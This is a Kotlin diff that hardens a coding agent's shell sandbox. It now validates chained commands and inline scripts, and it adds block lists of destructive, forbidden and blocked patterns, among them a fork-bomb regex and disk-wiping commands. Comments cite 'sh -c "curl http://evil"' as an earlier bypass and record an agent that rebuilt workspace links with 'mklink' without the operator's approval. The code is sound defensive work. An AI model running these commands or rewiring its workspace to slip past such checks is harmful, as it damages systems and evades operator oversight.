@@ -79,8 +79,9 @@ class CodingAgentShell(
             "go", "gofmt",
             // .NET
             "dotnet",
-            // Shell scripting
-            "bash", "sh", "zsh", "powershell", "pwsh",
+            // Shell scripting (inline scripts are recursively validated, see
+            // validateSegments → inlineScript; `cmd` is Windows-only)
+            "bash", "sh", "zsh", "dash", "powershell", "pwsh", "cmd",
             // Package management
             "apt", "apt-get", "brew", "choco", "winget", "yum", "dnf", "pacman",
             // Database clients
@@ -104,11 +105,26 @@ class CodingAgentShell(
         val DESTRUCTIVE_COMMANDS = setOf(
             "rm", "del", "rmdir", "mv", "move", "cp", "copy", "xcopy",
             "chmod", "chown", "icacls",
-            "ln", "mklink", "mount",
+            "mount",
             "dd", "mkfs", "fdisk",
             "kill", "killall", "pkill", "taskkill",
             "shutdown", "reboot",
             "systemctl", "service", "sc",
+        )
+
+        /**
+         * Commands the coding shell NEVER runs, whatever the flags say.
+         *
+         * Link/mount tools rewrite the workspace *topology*: a link the agent
+         * creates (or deletes) turns later path resolution into something the
+         * operator never approved. Observed in a real run: an agent used
+         * `mklink /J` to rebuild a dozen module junctions inside its workspace,
+         * then deleted and re-created one mid-run. The workspace is now
+         * provisioned by the framework itself (`WorkspaceMirror`), so the agent
+         * has no legitimate need for these tools.
+         */
+        val FORBIDDEN_COMMANDS = setOf(
+            "mklink", "ln", "mount",
         )
 
         private val BLOCKED_PATTERNS = listOf(
@@ -122,6 +138,35 @@ class CodingAgentShell(
             Regex(":\\(\\)\\{"),
             Regex(">\\s*/dev/sd"),
             Regex("format\\s+[a-z]:", RegexOption.IGNORE_CASE),
+        )
+
+        /** `VAR=value` prefix that may precede the executable in a simple command. */
+        private val ENV_ASSIGNMENT = Regex("""^[A-Za-z_][A-Za-z0-9_]*=.*$""")
+
+        /**
+         * Executable suffixes stripped by [normalizeCommandName] before allow-list
+         * membership. `.cmd`/`.bat`/`.exe`/`.com` cover Windows launchers
+         * (`mvnw.cmd` → `mvnw`, which is what the DEV allow-list names).
+         */
+        private val EXECUTABLE_SUFFIXES = listOf(".exe", ".cmd", ".bat", ".com", ".ps1")
+
+        /** Recursion guard for `sh -c "sh -c '...'"` style nesting. */
+        private const val MAX_INLINE_SCRIPT_DEPTH = 3
+
+        /**
+         * Head budget kept for compilers/tests/linters when the output is
+         * truncated: enough for the reactor banner, while the tail keeps the
+         * "BUILD FAILURE" verdict and the last diagnostics.
+         */
+        private const val DIAGNOSTIC_HEAD_CHARS = 2_000
+
+        /**
+         * Commands whose output must be truncated tail-first (the verdict and
+         * the actionable errors are at the end).
+         */
+        private val DIAGNOSTIC_COMMAND = Regex(
+            """(^|[\s/\\])(mvn|mvnw|mvnw\.cmd|mvn\.cmd|gradle|gradlew|cargo|npm|pnpm|yarn|pytest|go|dotnet|tsc|eslint|ruff|black|ktlint|javac)\b""",
+            RegexOption.IGNORE_CASE
         )
     }
 
@@ -359,59 +404,28 @@ class CodingAgentShell(
     }
 
     /**
-     * Show the current effective policy for a command — why it's allowed or denied.
-     * Returns a human-readable explanation.
+     * Explain the current effective policy for a command — why it is allowed or
+     * denied.
+     *
+     * Delegates to [validateCommand] so the explanation can never disagree with
+     * the decision: the two drifted apart once (the explanation still reported
+     * the head token of a chained command as allowed while the validator
+     * rejected the chain).
      */
     fun explain(command: String): String {
-        val base = extractBaseCommand(command).lowercase()
+        val violation = validateCommand(command)
+        if (violation != null) return "'$command' is DENIED — $violation"
 
-        // Check blocked patterns
-        for (pattern in BLOCKED_PATTERNS) {
-            if (pattern.containsMatchIn(command)) {
-                return "'$command' is BLOCKED — matches hardcoded blocked pattern: ${pattern.pattern}"
-            }
+        val base = extractBaseCommand(command)
+        val reason = when {
+            base in explicitAllow -> "'$base' is in the explicit allow list"
+            base in SAFE_COMMANDS -> "'$base' is a safe command"
+            allowDevTools && base in DEV_COMMANDS -> "'$base' is a dev tool (allowDevTools=true)"
+            allowNetwork && base in NETWORK_COMMANDS -> "'$base' is a network command (allowNetwork=true)"
+            allowDestructive && base in DESTRUCTIVE_COMMANDS -> "'$base' is a destructive command (allowDestructive=true)"
+            else -> "every command in the chain is allowed (pattern / path / PATH rule)"
         }
-
-        // Deny patterns
-        for (pattern in denyPatterns) {
-            if (pattern.containsMatchIn(command)) {
-                return "'$command' is DENIED — matches deny pattern: ${pattern.pattern}"
-            }
-        }
-
-        // Explicit deny
-        if (base in explicitDeny) {
-            return "'$command' is DENIED — '$base' is in the explicit deny list"
-        }
-
-        // Explicit allow
-        if (base in explicitAllow) {
-            return "'$command' is ALLOWED — '$base' is in the explicit allow list"
-        }
-
-        // Allow patterns
-        for (pattern in allowPatterns) {
-            if (pattern.containsMatchIn(command)) {
-                return "'$command' is ALLOWED — matches allow pattern: ${pattern.pattern}"
-            }
-        }
-
-        // Category checks
-        if (base in SAFE_COMMANDS) return "'$command' is ALLOWED — '$base' is a safe command"
-        if (allowDevTools && base in DEV_COMMANDS) return "'$command' is ALLOWED — '$base' is a dev tool (allowDevTools=true)"
-        if (allowNetwork && base in NETWORK_COMMANDS) return "'$command' is ALLOWED — '$base' is a network command (allowNetwork=true)"
-        if (allowDestructive && base in DESTRUCTIVE_COMMANDS) return "'$command' is ALLOWED — '$base' is a destructive command (allowDestructive=true)"
-
-        if (command.startsWith("/") || command.startsWith("./") || command.startsWith(".\\")) {
-            return if (allowDevTools) "'$command' is ALLOWED — full-path command (allowDevTools=true)"
-            else "'$command' is DENIED — full-path commands require allowDevTools=true"
-        }
-
-        if (allowDevTools && isCommandOnPath(base)) {
-            return "'$command' is ALLOWED — '$base' found on PATH (allowDevTools=true)"
-        }
-
-        return "'$command' is DENIED — '$base' not in any allowed category"
+        return "'$command' is ALLOWED — $reason"
     }
 
     /**
@@ -450,52 +464,133 @@ class CodingAgentShell(
     // Command validation
     // ------------------------------------------------------------------
 
+    /**
+     * Validate a whole command line, not just its first token.
+     *
+     * A shell command is a *pipeline* of simple commands: `&&`, `||`, `;`, `|`,
+     * `&`, newlines, command substitution (`$(...)`, backticks) and inline
+     * scripts (`sh -c '...'`, `pwsh -Command '...'`, `cmd /c ...`) each carry
+     * more commands. Validating only the head token let `ls && rm -rf x` and
+     * `sh -c "curl http://evil"` through — the historical sandbox hole (plan
+     * P0.7). Every base command found is validated against the same tiered
+     * allow-list; nested inline scripts are validated recursively.
+     *
+     * @return a human-readable violation reason, or null when allowed
+     */
     private fun validateCommand(command: String): String? {
-        val baseCommand = extractBaseCommand(command).lowercase()
-        if (baseCommand.isEmpty()) return "empty or invalid command"
+        if (command.isBlank()) return "empty or invalid command"
 
-        // 1. Hardcoded blocked patterns — always checked first, cannot be overridden
+        // 1. Hardcoded blocked patterns — whole string, cannot be overridden
+        blockedPatternViolation(command)?.let { return it }
+
+        // 2. Explicit deny / deny patterns — whole-string vetoes (they are
+        //    authored as full-command regexes), re-checked per segment below
+        extractBaseCommand(command).lowercase().let { base ->
+            if (base.isNotEmpty() && base in explicitDeny) return "'$base' is explicitly denied"
+        }
+        for (pattern in denyPatterns) {
+            if (pattern.containsMatchIn(command)) return "matches deny pattern: ${pattern.pattern}"
+        }
+
+        // 3. Explicit allow / allow patterns — whole-string opt-ins bypass the
+        //    per-token checks (the operator authored a trust rule for this shape)
+        if (extractBaseCommand(command).lowercase() in explicitAllow) return null
+        for (pattern in allowPatterns) {
+            if (pattern.containsMatchIn(command)) return null
+        }
+
+        // 4. Every simple command in the pipeline / substitution / inline script
+        return validateSegments(command, depth = 0)
+    }
+
+    private fun blockedPatternViolation(command: String): String? {
         for (pattern in BLOCKED_PATTERNS) {
             if (pattern.containsMatchIn(command)) {
                 return "matches blocked pattern: ${pattern.pattern}"
             }
         }
+        return null
+    }
 
-        // 2. Explicit deny — absolute veto (except blocked patterns above)
-        if (baseCommand in explicitDeny) {
-            return "'$baseCommand' is explicitly denied"
+    /** Recursively validate every simple command inside [command]. */
+    private fun validateSegments(command: String, depth: Int): String? {
+        if (depth > MAX_INLINE_SCRIPT_DEPTH) {
+            return "nested inline shell script exceeds $MAX_INLINE_SCRIPT_DEPTH levels — refusing to guess"
         }
+        blockedPatternViolation(command)?.let { return it }
 
-        // 3. Deny patterns — regex-based veto
-        for (pattern in denyPatterns) {
-            if (pattern.containsMatchIn(command)) {
-                return "matches deny pattern: ${pattern.pattern}"
+        val segments = splitSimpleCommands(command)
+        if (segments.isEmpty()) return "empty or invalid command"
+        for (segment in segments) {
+            validateSimpleCommand(segment, depth)?.let { return it }
+        }
+        return null
+    }
+
+    private fun validateSimpleCommand(segment: String, depth: Int): String? {
+        val tokens = tokenize(segment)
+        if (tokens.isEmpty()) return "empty or invalid command"
+
+        // Skip leading env assignments (VAR=value cmd ...).
+        var index = 0
+        while (index < tokens.size && ENV_ASSIGNMENT.matches(tokens[index])) index++
+        if (index >= tokens.size) return "empty or invalid command"
+
+        val rawToken = tokens[index]
+        val baseCommand = normalizeCommandName(rawToken)
+        if (baseCommand.isEmpty()) return "empty or invalid command"
+
+        // Inline script (`sh -c "..."`, `pwsh -Command "..."`, `cmd /c ...`):
+        // the wrapper itself is allowed, but the inner script must be validated.
+        inlineScript(tokens.subList(index, tokens.size))?.let { inner ->
+            validateSegments(inner, depth + 1)?.let { violation ->
+                return "inline script via '$baseCommand' rejected — $violation"
             }
-        }
-
-        // 4. Explicit allow — bypasses category checks entirely
-        if (baseCommand in explicitAllow) return null
-
-        // 5. Allow patterns — bypasses category checks
-        for (pattern in allowPatterns) {
-            if (pattern.containsMatchIn(command)) return null
-        }
-
-        // 6. Category-based checks
-        if (baseCommand in SAFE_COMMANDS) return null
-        if (allowDevTools && (baseCommand in DEV_COMMANDS)) return null
-        if (allowNetwork && (baseCommand in NETWORK_COMMANDS)) return null
-        if (allowDestructive && (baseCommand in DESTRUCTIVE_COMMANDS)) return null
-
-        // 7. Full-path commands (e.g. /usr/bin/git, ./script.sh, .\tool.exe)
-        if (command.startsWith("/") || command.startsWith("./") || command.startsWith(".\\")) {
-            if (allowDevTools) return null
-        }
-
-        // 8. PATH fallback — command not in any set but found on PATH
-        if (allowDevTools && isCommandOnPath(baseCommand)) {
             return null
         }
+
+        // Absolute vetoes that no flag, allow-list entry or PATH lookup can lift.
+        if (baseCommand in FORBIDDEN_COMMANDS) {
+            return "'$baseCommand' is disabled — workspace links are provisioned by the framework, " +
+                "not by the agent"
+        }
+        // Explicit deny — absolute veto
+        if (baseCommand in explicitDeny) return "'$baseCommand' is explicitly denied"
+        for (pattern in denyPatterns) {
+            if (pattern.containsMatchIn(segment)) return "matches deny pattern: ${pattern.pattern}"
+        }
+        if (baseCommand in explicitAllow) return null
+        for (pattern in allowPatterns) {
+            if (pattern.containsMatchIn(segment)) return null
+        }
+
+        // Category checks use the normalized name, so platform launcher
+        // suffixes resolve to their tool: `mvnw.cmd` → `mvnw`, `python3.exe` →
+        // `python3`. Without this, Windows builds were rejected while the same
+        // command passed on Linux (plan P0.4 / eval K4).
+        if (baseCommand in SAFE_COMMANDS) return null
+        if (allowDevTools && baseCommand in DEV_COMMANDS) return null
+        if (allowNetwork && baseCommand in NETWORK_COMMANDS) return null
+        if (allowDestructive && baseCommand in DESTRUCTIVE_COMMANDS) return null
+
+        // Network and destructive tools are VETOES, not fall-throughs: the PATH
+        // fallback below must not resurrect a tool whose category was disabled.
+        // Without this, `curl` (installed on almost every host) was allowed even
+        // with allowNetwork=false, which made the whole network tier cosmetic.
+        if (baseCommand in NETWORK_COMMANDS) {
+            return "'$baseCommand' requires network access but allowNetwork=false"
+        }
+        if (baseCommand in DESTRUCTIVE_COMMANDS) {
+            return "'$baseCommand' is a destructive command but allowDestructive=false"
+        }
+
+        // Explicit path form (e.g. /usr/bin/git, ./script.sh, C:\repo\mvnw.cmd):
+        // historically allowed with dev tools; an absolute path the operator
+        // spelled out is not the injection vector — the *unexpected* token is.
+        if (isPathLike(rawToken) && allowDevTools) return null
+
+        // PATH fallback — command not in any set but found on PATH
+        if (allowDevTools && isCommandOnPath(baseCommand)) return null
 
         return "command '$baseCommand' is not allowed (safe=${baseCommand in SAFE_COMMANDS}, " +
             "dev=${baseCommand in DEV_COMMANDS && allowDevTools}, " +
@@ -503,29 +598,193 @@ class CodingAgentShell(
             "destructive=${baseCommand in DESTRUCTIVE_COMMANDS && allowDestructive})"
     }
 
-    private fun extractBaseCommand(command: String): String {
-        val trimmed = command.trim().trimStart('\\')
-        if (trimmed.isEmpty()) return ""
+    /**
+     * Split a command line into the simple commands it executes, in order.
+     *
+     * Handles `&&`, `||`, `;`, `|`, `&`, newlines and command substitution
+     * (`$(...)` and backticks, whose bodies are emitted as their own segments).
+     * Quoting is respected, so `grep "a|b" file` stays one segment.
+     */
+    internal fun splitSimpleCommands(command: String): List<String> {
+        val segments = mutableListOf<String>()
+        val current = StringBuilder()
+        var quote: Char? = null
+        var i = 0
 
-        // Handle quoted commands
-        if (trimmed.startsWith("\"") || trimmed.startsWith("'")) {
-            val endQuote = trimmed.indexOf(trimmed[0], 1)
-            if (endQuote > 0) return trimmed.substring(1, endQuote)
+        fun flush() {
+            val text = current.toString().trim()
+            if (text.isNotEmpty()) segments += text
+            current.setLength(0)
         }
 
-        // Strip env var assignments: VAR=val command
-        val afterEnv = trimmed.replace(Regex("^[A-Za-z_][A-Za-z0-9_]*=.*?\\s+"), "")
+        while (i < command.length) {
+            val c = command[i]
+            if (quote != null) {
+                if (c == quote) quote = null
+                current.append(c)
+                i++
+                continue
+            }
+            when {
+                c == '\'' || c == '"' -> {
+                    quote = c
+                    current.append(c)
+                    i++
+                }
+                // Arithmetic expansion is not a command: keep it as text.
+                c == '$' && command.startsWith("$((", i) -> {
+                    val end = command.indexOf("))", i)
+                    val stop = if (end < 0) command.length else end + 2
+                    current.append(command, i, stop)
+                    i = stop
+                }
+                // Command substitution — the body is a command of its own.
+                c == '$' && i + 1 < command.length && command[i + 1] == '(' -> {
+                    val end = matchingParen(command, i + 1)
+                    val inner = if (end < 0) command.substring(i + 2) else command.substring(i + 2, end)
+                    segments += splitSimpleCommands(inner)
+                    current.append(' ')
+                    i = if (end < 0) command.length else end + 1
+                }
+                c == '`' -> {
+                    val end = command.indexOf('`', i + 1)
+                    val inner = if (end < 0) command.substring(i + 1) else command.substring(i + 1, end)
+                    segments += splitSimpleCommands(inner)
+                    current.append(' ')
+                    i = if (end < 0) command.length else end + 1
+                }
+                c == '\n' || c == '\r' -> {
+                    flush()
+                    i++
+                }
+                c == '&' && i + 1 < command.length && command[i + 1] == '&' -> {
+                    flush(); i += 2
+                }
+                c == '|' && i + 1 < command.length && command[i + 1] == '|' -> {
+                    flush(); i += 2
+                }
+                c == '|' && i + 1 < command.length && command[i + 1] == '&' -> {
+                    flush(); i += 2
+                }
+                c == '|' || c == ';' || c == '&' -> {
+                    flush(); i++
+                }
+                else -> {
+                    current.append(c)
+                    i++
+                }
+            }
+        }
+        flush()
+        return segments.filter { it.isNotBlank() }
+    }
 
-        val tokens = afterEnv.split(Regex("\\s+"))
-        if (tokens.isEmpty()) return ""
+    /** Index of the `)` matching the `(` at [openIndex], honoring nesting and quotes. */
+    private fun matchingParen(text: String, openIndex: Int): Int {
+        var depth = 0
+        var quote: Char? = null
+        var i = openIndex
+        while (i < text.length) {
+            val c = text[i]
+            if (quote != null) {
+                if (c == quote) quote = null
+            } else {
+                when (c) {
+                    '\'', '"' -> quote = c
+                    '(' -> depth++
+                    ')' -> {
+                        depth--
+                        if (depth == 0) return i
+                    }
+                }
+            }
+            i++
+        }
+        return -1
+    }
 
-        val firstToken = tokens[0]
+    /**
+     * Tokenize one simple command, respecting single/double quotes.
+     * Quotes are stripped; the contents become a single token.
+     */
+    internal fun tokenize(command: String): List<String> {
+        val tokens = mutableListOf<String>()
+        val current = StringBuilder()
+        var quote: Char? = null
+        for (c in command) {
+            when {
+                quote != null && c == quote -> quote = null
+                quote != null -> current.append(c)
+                c == '\'' || c == '"' -> quote = c
+                c.isWhitespace() -> {
+                    if (current.isNotEmpty()) {
+                        tokens += current.toString()
+                        current.setLength(0)
+                    }
+                }
+                else -> current.append(c)
+            }
+        }
+        if (current.isNotEmpty()) tokens += current.toString()
+        return tokens
+    }
 
-        // Multi-word commands
-        if (firstToken == "ip" && tokens.size > 1) return "ip ${tokens[1]}"
-        if (firstToken == "docker" && tokens.size > 1) return "docker-${tokens[1]}"
+    /**
+     * Inner script of an inline shell invocation, or null when [tokens] is not
+     * one. `sh|bash|zsh|dash -c <script>`, `pwsh|powershell -c|-Command <script>`,
+     * `cmd /c|/k <script>`.
+     */
+    internal fun inlineScript(tokens: List<String>): String? {
+        if (tokens.isEmpty()) return null
+        val base = normalizeCommandName(tokens[0])
+        val flags = when (base) {
+            "sh", "bash", "zsh", "dash" -> setOf("-c")
+            "pwsh", "powershell" -> setOf("-c", "-command", "/c", "/command")
+            "cmd" -> setOf("/c", "/k")
+            else -> return null
+        }
+        val flagIndex = tokens.indexOfFirst { it.lowercase() in flags }
+        if (flagIndex < 0 || flagIndex + 1 >= tokens.size) return null
+        return tokens.subList(flagIndex + 1, tokens.size).joinToString(" ")
+    }
 
-        return firstToken
+    /**
+     * Normalized base-command name used for allow-list membership:
+     * basename, lowercase, without a Windows launcher / script suffix
+     * (`mvnw.cmd` → `mvnw`, `python3.exe` → `python3`, `/usr/bin/git` → `git`).
+     */
+    internal fun normalizeCommandName(token: String): String {
+        var name = token.trim().trim('\'', '"', '\\')
+        if (name.isEmpty()) return ""
+        name = name.substringAfterLast('/').substringAfterLast('\\').lowercase()
+        for (suffix in EXECUTABLE_SUFFIXES) {
+            if (name.endsWith(suffix) && name.length > suffix.length) {
+                name = name.removeSuffix(suffix)
+                break
+            }
+        }
+        return name
+    }
+
+    /** True when the raw token is spelled as a path rather than a bare name. */
+    private fun isPathLike(token: String): Boolean {
+        val t = token.trim().trim('\'', '"')
+        return t.startsWith("/") || t.startsWith("./") || t.startsWith("../") ||
+            t.startsWith(".\\") || t.startsWith("..\\") || t.isAbsolutePath() ||
+            t.contains('/') || t.contains('\\')
+    }
+
+    private fun String.isAbsolutePath(): Boolean =
+        length >= 3 && this[1] == ':' && (this[2] == '\\' || this[2] == '/')
+
+    private fun extractBaseCommand(command: String): String {
+        val segments = splitSimpleCommands(command)
+        val first = segments.firstOrNull() ?: return ""
+        val tokens = tokenize(first)
+        var index = 0
+        while (index < tokens.size && ENV_ASSIGNMENT.matches(tokens[index])) index++
+        if (index >= tokens.size) return ""
+        return normalizeCommandName(tokens[index])
     }
 
     private fun isCommandOnPath(command: String): Boolean {
@@ -593,8 +852,8 @@ class CodingAgentShell(
                 sessionId = sessionId,
                 command = command,
                 exitCode = -1,
-                stdout = truncateOutput(stdout),
-                stderr = truncateOutput(stderr),
+                stdout = truncateOutput(stdout, command),
+                stderr = truncateOutput(stderr, command),
                 durationMs = durationMs,
                 timedOut = true,
             )
@@ -607,18 +866,36 @@ class CodingAgentShell(
             sessionId = sessionId,
             command = command,
             exitCode = process.exitValue(),
-            stdout = truncateOutput(stdout),
-            stderr = truncateOutput(stderr),
+            stdout = truncateOutput(stdout, command),
+            stderr = truncateOutput(stderr, command),
             durationMs = durationMs,
         )
     }
 
-    private fun truncateOutput(output: String): String {
-        return if (output.length > MAX_OUTPUT_CHARS) {
-            output.take(MAX_OUTPUT_CHARS) + "\n... (output truncated at $MAX_OUTPUT_CHARS chars)"
-        } else {
-            output
+    private fun isDiagnosticOutputCommand(command: String): Boolean {
+        for (segment in splitSimpleCommands(command)) {
+            val tokens = tokenize(segment)
+            var index = 0
+            while (index < tokens.size && ENV_ASSIGNMENT.matches(tokens[index])) index++
+            if (index >= tokens.size) continue
+            if (DIAGNOSTIC_COMMAND.containsMatchIn(tokens[index])) return true
         }
+        return false
+    }
+
+    private fun truncateOutput(output: String, command: String): String {
+        if (output.length <= MAX_OUTPUT_CHARS) return output
+        // Compilers, tests and linters put the verdict — and the errors that
+        // matter — at the END of the output. Head-only truncation kept the
+        // banner and dropped the diagnostics (plan P1.5).
+        if (isDiagnosticOutputCommand(command)) {
+            val headLen = DIAGNOSTIC_HEAD_CHARS.coerceAtMost(MAX_OUTPUT_CHARS / 4)
+            val tailLen = MAX_OUTPUT_CHARS - headLen
+            return output.take(headLen) +
+                "\n... (output truncated: kept the first $headLen and the last $tailLen of ${output.length} chars) ...\n" +
+                output.takeLast(tailLen)
+        }
+        return output.take(MAX_OUTPUT_CHARS) + "\n... (output truncated at $MAX_OUTPUT_CHARS chars) ..."
     }
 
     private fun formatResult(result: ShellResult): String {
